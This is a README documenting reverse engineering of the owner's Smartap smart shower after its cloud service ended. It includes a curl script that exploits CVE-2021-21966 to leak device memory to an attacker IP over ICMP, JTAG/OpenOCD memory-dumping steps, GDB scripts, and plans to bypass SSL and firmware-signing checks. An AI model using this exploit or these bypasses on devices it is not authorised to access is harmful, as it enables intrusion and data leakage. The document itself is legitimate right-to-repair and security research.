# Reverse Engineering the Smartap Smart Shower

# Table of Contents

1. [Overview](#overview)
2. [Background & Motivation](#background--motivation)
3. [Repository Structure](#repository-structure)
4. [The Cloud Dependency Problem](#the-cloud-dependency-problem)
5. [Initial Software Investigation](#initial-software-investigation)
   - [Exploring CVE-2021-21966](#exploring-cve-2021-21966)
   - [Hardware Access Challenges](#hardware-access-challenges)
6. [JTAG Access](#jtag-access)
   - [Pin Identification](#pin-identification)
   - [Setting Up OpenOCD](#setting-up-openocd)
7. [Memory Analysis](#memory-analysis)
   - [Initial Memory Dump](#initial-memory-dump)
   - [Analysis of Memory Contents](#analysis-of-memory-contents)
   - [Binary Analysis with Ghidra](#binary-analysis-with-ghidra)
   - [SSL Validation Analysis](#ssl-validation-analysis)
8. [GDB Investigation and Script Development](#gdb-investigation-and-script-development)
   - [Research Challenges and Ongoing Work](#research-challenges-and-ongoing-work)
9. [Flash Memory Access](#flash-memory-access)
10. [Community Research](#community-research)
11. [Research Status](#research-status)
12. [Acknowledgements](#acknowledgements)


## Overview

This repository documents the journey of reverse engineering the Smartap smart shower system - a tale of what happens when cloud-dependent IoT devices meet defunct cloud services.  I embarked on this project after the manufacturer ceased trading and their cloud services went offline, effectively turning these perfectly functional smart showers into very expensive dumb ones.

## Background & Motivation

The Smartap smart shower system was originally marketed as a high-end smart home device, available in the UK through VictoriaPlumb for £695. It boasted integration with:
- iOS and Android mobile apps
- Google Assistant
- Amazon Alexa
- IFTTT

Key smart features included:
- Remote shower pre-heating
- Multiple valve control for different shower heads/bath
- Temperature and pressure monitoring
- Usage analytics and scheduling

I was pioneering (foolish) enough to have one installed as part of a complete bathroom renovation. Yes, that means my entire bathroom was designed, built, and crucially, tiled around this unit. From the moment of installation, I was acutely aware that I was at the mercy of the vendor's cloud infrastructure - a classic case of "technical debt".

The majority of this research was conducted last year but has been paused due to time constraints and other commitments. I'm now documenting and sharing what I've learned, working from my research notes, in the hope that others might benefit from this work or potentially continue where I left off.
This is very much a work in progress. While significant insights were gained into the device's operation, there's still much to explore and understand. By sharing this research now, rather than waiting until it's "complete," I hope to:

- Provide valuable information to others facing similar challenges
- Create opportunities for collaboration and knowledge sharing
- Document the challenges and progress made so far 
- Maintain a record of the research for when I'm able to return to it

### Repository Structure

```
├── android/
│   └── SmarTap Digital Shower_1.3.0_Apkpure.apk    # Original Android application
├── documentation/
│   ├── Smartap - Installation Guide.pdf            # Original manufacturer documentation
│   └── Smartap - Guidelines For Pairing Smartap E-Valve.pdf
├── memory/
│   ├── SRAM.bin                                    # Memory dumps from device
│   └── RAM.bin
├── memory-analysis/
│   └── memory-analysis-export-ghidra.c             # Ghidra analysis exports
├── scripts/
│   └── configure-wifi.py                           # Utility scripts
├── LICENSE
└── README.md
```

I've tried to organise the information collected during this research and provide it in a neat structure.

#### /documentation

Original manufacturer documentation, preserved for reference. 

These documents provide insight into the intended functionality and setup procedures.

#### /memory

Binary dumps extracted from the device during the research process. 

See the Memory Analysis section of this README for details on how these were obtained and analyzed.

#### /memory-analysis

Exports and analysis from Ghidra decompilation work. 

These files represent the deeper technical analysis of the device's functionality.

#### /android

The original Android application, preserved for reference and potential future analysis.

#### /scripts

Utility scripts developed during the research:

* configure-wifi.py: A simple utility script created as a development scratchpad to help reconfigure the device's WiFi settings. This was particularly useful during the research phase when the device needed to be repeatedly reconnected to different networks for testing. It's not polished, but it demonstrates basic interaction with the device's local web server.

### The Cloud Dependency Problem

While cloud dependency isn't universal or necessary for IoT devices, Smartap chose to make their device entirely dependent on their cloud services. A preliminary investigation revealed that the only locally operating service was a basic web server, primarily used for WiFi configuration:

```bash
curl http://192.168.99.10
{"ssidList":["MYSSID"],"lowPowerMode":false,"serial":"MYSERIALNUMBER","dns":"smartap-tech.com","port":80,"outlet1":1,"outlet2":2,"outlet3":4,"k3Outlet":true,"swVer":"0x355","wnpVer":"2.:.0.000","mac":"XX:XX:XX:XX:XX:XX"}"oldAppVer":"pkey:0000,XXXXXXXXX"
```

When the manufacturer ceased trading approximately a year ago, their cloud services disappeared, taking all the smart functionality with them. While the basic shower operation remained intact (thank goodness), all smart features became inoperable.

## Initial Software Investigation

Before proceeding with hardware analysis, initial research focused on known vulnerabilities in the TI CC3200 SDK. 

This investigation centered on CVE-2021-21966 (https://nvd.nist.gov/vuln/detail/CVE-2021-21966), a memory disclosure vulnerability in the SDK's default web server implementation.

### Exploring CVE-2021-21966

The CC3200 SDK includes a default web page `ping.html` that provides ICMP ping functionality. 

This feature exists because the SDK ships with example code demonstrating network connectivity testing. Smartap appear to have left this feature enabled in their production firmware.

The vulnerability arises from improper bounds checking on the ICMP packet size parameter. When constructing an ICMP packet, the device:
1. Allocates a buffer based on the requested packet size
2. Copies data into this buffer to form the ICMP payload
3. Due to insufficient bounds checking, can be tricked into copying data from beyond the intended buffer

This vulnerability was identified by Talso and is documented fully, here https://talosintelligence.com/vulnerability_reports/TALOS-2021-1393

This implementation flaw means we can potentially retrieve contents of memory adjacent to the ICMP buffer by requesting oversized packets.

Here's a script to trigger the vulnerability:

```bash
#!/bin/bash
ATTACKER_IP="192.168.99.250"
TARGET="192.168.99.10"
curl -i -s -k -X $'POST' \
-H $'Content-Length: 51' \
--data-binary $"__SL_P_T.A=${ATTACKER_IP}&__SL_P_T.B=1472&__SL_P_T.C=1" \
$"http://${TARGET}/ping.html"
```

To capture the resulting packets containing memory contents:

```bash
# On the attacker machine (192.168.99.250):
sudo tcpdump -i any -n -vv icmp and host 192.168.99.10 -w smartap_memory_leak.pcap
```

While this vulnerability successfully triggered memory disclosure from the device, analysis of the captured packets revealed no immediately useful information. The disclosed memory appeared to be from regions not containing sensitive data or code of interest. This outcome isn't entirely surprising - the location and content of leaked memory can be quite unpredictable and may vary between device reboots or different firmware versions.

This initial exploration demonstrated that while software vulnerabilities might provide some access to the device, a more direct hardware-based approach would be necessary to gain meaningful insights into the device's operation.

### Hardware Access Challenges

The CC3200 MCU ([Technical Documentation](https://www.ti.com/product/CC3200)) offers multiple interfaces (UART, SPI, I2C), but most are inaccessible in this device.

The CC3200 SimpleLink Wi-Fi device provides the following security features:
```
- Serial flash boot - Secure boot from serial flash
- UART/SPI disabled by eFuse
- Debug security - JTAG can be permanently disabled
Source: CC3200 SimpleLink™ Wi-Fi® and IoT Solution with MCU LaunchPad Hardware User's Guide (SWRU372B)
```

Examining the board with the shielding removed reveals that accessing the MCU pins directly would be challenging. Most pins are either buried in internal layers of the PCB or are underneath the MCU in a BGA (Ball Grid Array) configuration.

## JTAG Access

### Pin Identification
The initial breakthrough in accessing the device came from the Home Assistant community, where members documented and photographed the JTAG header locations on the board. 

This information can be found, here: https://community.home-assistant.io/t/smartap-shower-control-getting-started-with-reverse-engineering-a-smart-home-device/358251/206

Building on this community research, I attached a Raspberry Pi's GPIO pins to the JTAG interface on the Smartap board and used  [JTAGenum](https://github.com/cyphunk/JTAGenum) to confirm the JTAG interface pins.

The tool successfully identified the JTAG interface, revealing:
```
IR length: 6
Chain length: 1
Device Id: 00001011100101111100000000101111 (0x0B97C02F)
Manufacturer: Texas Instruments (0x02F)
```

This device ID confirmed the correct Texas Instruments chip and validated the JTAG pin identification.

### Setting Up OpenOCD
With the JTAG pins identified, I can use OpenOCD for device access. 

Here's the OpenOCD configuration used:

```cfg
source [find target/swj-dp.tcl]

# Using the name on the SoC
if { [info exists CHIPNAME] } {
  set _CHIPNAME $CHIPNAME
} else {
  set _CHIPNAME cc3200 
}

# TAP ID discovered earlier
if { [info exists CPUTAPID] } {
  set _CPUTAPID $CPUTAPID
} else {
  set _CPUTAPID 0x0B97C02F
}

adapter_khz 200
transport select jtag
reset_config srst_nogate

swj_newdap $_CHIPNAME cpu -irlen 4 -ircapture 0x1 -irmask 0xf -expected-id $_CPUTAPID
dap create $_CHIPNAME.dap -chain-position $_CHIPNAME.cpu
target create $_TARGETNAME cortex_m -dap $_CHIPNAME.dap
set _TARGETNAME $_CHIPNAME.cpu
```

Connecting to the device using OpenOCD:
```bash
openocd -f interface/sysfsgpio-raspberrypi.cfg -c "transport select jtag" -f ./ti_cc32xx.cfg
```

This provides access to OpenOCD's debugging interface on port 4444 and a GDB server on port 3333.

## Memory Analysis

### Initial Memory Dump
Using OpenOCD's debugging interface, the device's SRAM could be dumped for analysis:

```bash
# Connect to OpenOCD's debugger interface
telnet localhost 4444

# Halt the CPU and dump memory
> halt
[cc32xx.cpu] halted due to debug-request, current mode: Thread
xPSR: 0x61000000 pc: 0x2001a328 psp: 0x20031cf0
> dump_image sram-dump-001.bin 0x20004000 0x20037000
```

You can find this memory dump in this repo.

### Analysis of Memory Contents
Initial analysis of the memory dump using the `strings` command revealed several interesting patterns:

1. SSL Certificate References:
```
/cert/129.der
/cert/130.der
/cert/131.der
```

2. Domain Validation Strings:
```
smartap-tech.com
Host: eValve.smartap-tech.com
```

3. Error Handling Related to SSL:
```
http_connect_server: ERROR SL_SO_SECMETHOD, status=%d
http_connect_server: ERROR SL_SO_SECURE_FILES_CERTIFICATE_FILE_NAME, status=%d
http_connect_server: ERROR SL_SO_SECURE_FILES_PRIVATE_KEY_FILE_NAME, status=%d
http_connect_server: ERROR SO_SECURE_DOMAIN_NAME_VERIFICATION, status=%d
```

### Binary Analysis with Ghidra
After obtaining the memory dump, I used Ghidra to understand the code structure and identify interesting functions.

The memory dump was loaded into Ghidra starting at address 0x20004000, which represents the base address where the code was executing in the device's memory space. 

This base address is crucial as it serves as the reference point for all function offsets in the subsequent analysis and GDB scripts.

Using Ghidra's decompilation capabilities, it was possible to identify and analyze key functions related to SSL certificate validation and network communication. 

The function addresses seen in the GDB scripts that I've shared (like 0x12800 for SSL operations) are offsets relative to this base address, representing where these functions were found in the memory dump.

For example, when the GDB script references `$BASE_OFFSET + 0x12800`, this maps to the actual memory address 0x20016800 on the device, where one of the main SSL validation routines was identified through Ghidra's analysis.

### SSL Validation Analysis
The investigation revealed three distinct security checks in the device's SSL validation process. Interestingly, the implementation closely follows TI's SSL example code from the CC3200 SDK, but with modifications to the certificate validation approach.

1. Domain Name Verification
   - Checks for the string "smartap.com" in the certificate's CN field
   - Uses a simple string match, looking for the presence of this string anywhere within the CN
   - This appears to be a modification of TI's example domain verification which uses `SL_SO_SECURE_DOMAIN_NAME_VERIFICATION`

2. Certificate Chain Validation
   - Multiple certificate files are checked (129.der, 130.der, 131.der)
   - The validation process verifies the entire certificate chain
   - The naming convention matches TI's example SSL code which uses "client.der", "ca.der" for certificates
   - The error messages found in memory (`SL_SO_SECURE_FILES_CERTIFICATE_FILE_NAME`) correspond to TI's documented SSL constants

3. Additional Security Checks
   - Several other security-related validations at the socket level
   - These include method verification and private key validation
   - The implementation uses TI's SimpleLink socket options like `SL_SO_SECMETHOD`, `SL_SO_SECURE_MASK`

This correlation with TI's example code provides additional confidence in the analysis of the security implementation and potential modification points.

https://software-dl.ti.com/ecs/CC3200SDK/1_5_0/exports/cc3200-sdk/example/ssl/README.html

## GDB Investigation and Script Development

### Key Functions Identified
Memory analysis and debugging revealed several critical functions:

```
- FUN_000139d4: Socket creation/operations
- FUN_0001190c: Certificate loading/processing
- FUN_00012800: SSL/TLS operations
- FUN_0000b354: Global data access
- FUN_0000edcc: SSL/TLS data sending
- FUN_00010298: SSL/TLS data sending (alternate)
- FUN_00012b90: SSL/TLS data receiving
- FUN_00014580: SSL/TLS connection closure
```

### GDB Scripting
Here's a GDB script that I put together while investigating the SSL checks

```gdb
# Set base memory offset
set $BASE_OFFSET = 0x20004000

# Load custom commands
source ./commands.gdb

# Certificate Loading Function (0x1190C)
break *($BASE_OFFSET + 0x1190C)
commands
  silent
  printf "Function: Certificate Loading\n"
  printf "Parameters:\n"
  printf "R0 (Certificate Path): %s\n", (char*)$r0
  printf "R1 (Flags): 0x%x\n", $r1
  # Monitor but don't modify
  continue
end

# SSL/TLS Operations (0x12800)
break *($BASE_OFFSET + 0x12800)
commands
  silent
  printf "Function: SSL/TLS Operation\n"
  printf "Operation Type: %d\n", $r1
  # Log parameters and stack
  x/10x $sp
  continue
end

# Domain Verification
break *($BASE_OFFSET + 0x14a30)
commands
  silent
  printf "Domain Verification Check\n"
  printf "Target Domain: %s\n", (char*)$r1
  continue
end

# Enhanced logging for error paths
break *($BASE_OFFSET + 0x10f2c)
commands
  silent
  printf "Error Logger Called\n"
  printf "Error Message: %s\n", (char*)$r0
  printf "Error Code: %d\n", $r1
  backtrace
  continue
end
```

### Custom GDB Commands
And these helper commands were created to assist with debugging:

```gdb
define sp
  silent
  stepi
  info registers
  printf "r0  = 0x%08x\n", $r0
  x/x $r0
  printf "r1  = 0x%08x\n", $r1
  x/x $r1
  continue
end
```

### Research Challenges and Ongoing Work
The GDB debugging efforts detailed above represent work in progress. Several challenges were encountered during this phase of research:

Watchdog Timer Interruptions

- The device's watchdog timer frequently triggered during debugging sessions
- These interruptions would cause the device to reboot, disrupting analysis
- Each reboot required re-establishing JTAG connections and restarting debugging sessions
- Further investigation is needed to reliably disable or work around the watchdog timer

### Incomplete Understanding

- While the SSL validation process is partially understood, more analysis is needed
- Some memory regions and function purposes remain unclear
- Additional work is required to fully map the device's security model

### Future GDB Work

- Development of more sophisticated debugging scripts
- Better handling of device resets during debugging
- More comprehensive logging of SSL/TLS operations
- Further investigation of certificate validation processes
- Understand the firmware upgrade process:
  - Can we produce a custom firmware
  - Can we introduce this to a device without direct access to the flash
  - Eg. Override the firmware signing checks via JTAG and trigger an upgrade from a custom location
  

### Flash Memory Access

The next logical step in this research would be to dump the contents of the flash memory chip. This would enable:
1. Detailed firmware analysis
2. Understanding of the update process
3. Potential modification of security checks at the firmware level
4. Building and deploying custom firmware

However, accessing the flash presents significant challenges:
- The flash chip uses an extremely fine-pitch package
- Even under microscope magnification, reliably connecting to the pins is problematic
- Risk of damaging the only available device during the attempt
- Need for specialized equipment to read at these pin densities

Successful flash content extraction would enable:
1. **Firmware Analysis**: Understanding how the device processes updates and validates firmware
2. **Security Modifications**: Potential patches to bypass built-in security checks
3. **Custom Firmware**: Development of new firmware that could be injected using JTAG
4. **Update Process**: Understanding the update validation process to potentially deploy custom updates

Future work will focus on developing a reliable method to access the flash contents without damaging the device. This might involve:
1. Custom PCB with test points for the flash chip
2. Modified hot-air rework station for chip removal
3. Specialized probing equipment for in-situ reading

## Community Research

This research builds upon valuable work done by the Home Assistant community, particularly in [this discussion thread](https://community.home-assistant.io/t/smartap-shower-control-getting-started-with-reverse-engineering-a-smart-home-device/358251/207). 

The thread contains additional photographs of the device internals, including clear images of the JTAG port locations, which proved invaluable during the hardware investigation phase.

## Research Status

### Key Findings
1. The device implements a three-layer security model for SSL validation:
   - Domain verification (with a potentially exploitable string matching approach)
   - Certificate chain validation
   - Additional security checks at the socket level

2. The CC3200's JTAG interface provides significant insight into the device's operation:
   - Full memory access is possible
   - Runtime debugging can reveal security implementation details
   - Error handling provides valuable information about internal processes

3. The cloud dependency was a design choice rather than a technical necessity:
   - Local web server functionality exists
   - Basic device operations remain functional without cloud access
   - Smart features could potentially be reimplemented locally

### Ethical Considerations
This research was conducted on a device that:
1. Is no longer supported by the manufacturer
2. Has had its cloud services terminated
3. Was purchased and owned by the researcher

The goal of this research is to:
- Document the impact of cloud service termination on IoT devices
- Explore possibilities for device resurrection post-manufacturer support
- Share knowledge that might help others in similar situations
- Promote discussion about IoT device longevity and right-to-repair

### Community Contributions
This research is being shared to help others who:
1. Own similar devices and want to understand their options
2. Are interested in IoT device security research
3. Want to learn about reverse engineering techniques
4. Are concerned about cloud dependency in IoT devices

Contributions, suggestions, and improvements to this research are welcome. Please feel free to:
- Open issues for questions or suggestions
- Submit pull requests with improvements
- Share your own experiences with similar devices
- Propose additional areas for investigation

## References

1. Texas Instruments CC3200 Documentation
   - [CC3200 Product Page](https://www.ti.com/product/CC3200)
   - [SimpleLink™ Wi-Fi® SDK](https://software-dl.ti.com/ecs/CC3200SDK/1_5_0/exports/cc3200-sdk/example/ssl/README.html)

2. Security Research
   - [CVE-2021-21966](https://nvd.nist.gov/vuln/detail/CVE-2021-21966)
   - [Talos Intelligence Report](https://talosintelligence.com/vulnerability_reports/TALOS-2021-1393)

3. Community Resources
   - [Home Assistant Community Discussion](https://community.home-assistant.io/t/smartap-shower-control-getting-started-with-reverse-engineering-a-smart-home-device/358251/207)
   - [bigclivedotcom's Hardware Teardown Video](https://www.youtube.com/watch?v=1zZzIOk19dI)

4. Tools
   - [JTAGenum](https://github.com/cyphunk/JTAGenum)
   - [OpenOCD](https://openocd.org/)

## Acknowledgements
- bigclivedotcom for the initial hardware teardown video: https://www.youtube.com/watch?v=1zZzIOk19dI
- The JTAGenum project for their excellent pin identification tool
- The OpenOCD project for making this investigation possible
- The Home Assistant community, particularly the contributors to the Smartap reverse engineering thread
- The broader IoT security research community for their continuous work in this field